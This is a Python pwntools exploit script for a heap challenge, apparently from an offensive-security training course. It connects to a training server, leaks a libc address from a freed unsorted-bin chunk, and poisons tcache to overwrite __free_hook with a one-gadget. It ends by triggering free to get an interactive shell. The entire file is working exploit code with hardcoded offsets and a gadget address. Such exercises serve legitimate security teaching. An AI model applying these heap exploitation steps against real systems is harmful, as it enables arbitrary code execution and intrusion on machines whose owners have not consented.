from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./playground")
    gdb.attach(r, """
            # b *0x00401255
            c
            """)
    input("wait")
else:
    r = remote("bin.training.offdef.it", 4110)

# Definition of functions

# Malloc a chunk of size size


def malloc(size):
    r.sendline(b"malloc " + str(size).encode())
    temp = r.recvline()[4:].strip()
    addr = int(temp, 16)
    r.recvuntil(b"> ")
    log.info("malloc: " + hex(addr))
    return addr

# Free a chunk at address addr


def free(addr):
    r.sendline(b"free " + hex(addr).encode())
    r.recvline()
    r.recvuntil(b"> ")
    log.info("free: " + hex(addr))

# Show n chunks starting from address addr


def show(addr, n=1, from_idx=0):
    r.sendline(b"show " + hex(addr).encode() +
               b" " + str(n + from_idx).encode())
    for i in range(from_idx):
        r.recvline()
    data = b""
    for i in range(n):
        r.recvuntil(b": ")
        temp = r.recvline().strip()
        log.info("show: " + hex(addr + i * 8) + " " + str(temp))
        data += temp
    r.recvuntil(b"> ")
    return data

# Write data at address addr


def write(addr, data):
    r.sendline(b"write " + hex(addr).encode() +
               b" " + str(len(data) + 1).encode())
    line = r.recvline()
    if b"fail" in line:
        log.error("write failed")
    else:
        r.sendline(data)
        r.recvline()
    r.recvuntil(b"> ")
    log.info("write: " + hex(addr) + " " + str(data) + " " + str(len(data)))

########## EXPLOIT ##########


input("wait")

r.recvuntil(b"main: ")
main = int(r.recvuntil(b"\n")[:-1], 16)
print(hex(main))

r.recvuntil(b"> ")

bss_max_heap_offset = 0x2EC7
arbitrary_chunk_max_heap_addr = main + bss_max_heap_offset

unsorted_chunk = malloc(0x600)
malloc(0x20)
free(unsorted_chunk)

appogggio = show(unsorted_chunk, 0x1)
print(appogggio)
leaked_libc = int(appogggio, 16)

libc_base_offset = 0x3EBCA0
libc_base = leaked_libc - libc_base_offset

gadget = libc_base + 0x4f302

print("leaked libc, gadget address :", hex(gadget))

chunk1 = malloc(0x60)
chunk2 = malloc(0x60)

print("PRINT CHUNK1:")
print(chunk1)

free(chunk1)
free(chunk2)

write(chunk2, p64(arbitrary_chunk_max_heap_addr))

malloc(0x60)
arbitrary_chunk_max_heap = malloc(0x60)

print("rewriting max heap value")

write(arbitrary_chunk_max_heap, p64(0xfffffffffffff000))

free(chunk1)
free(chunk2)

free_hook_offset = 0x3ED8E8
free_hook_address = libc_base + free_hook_offset

write(chunk2, p64(free_hook_address))

malloc(0x60)
arbitrary_chunk_malloc_hook = malloc(0x60)

write(arbitrary_chunk_malloc_hook, p64(gadget))

print("last free to call free hook")

r.sendline(b"free " + hex(chunk1).encode())


# r.sendline(b"aaa")


r.interactive()
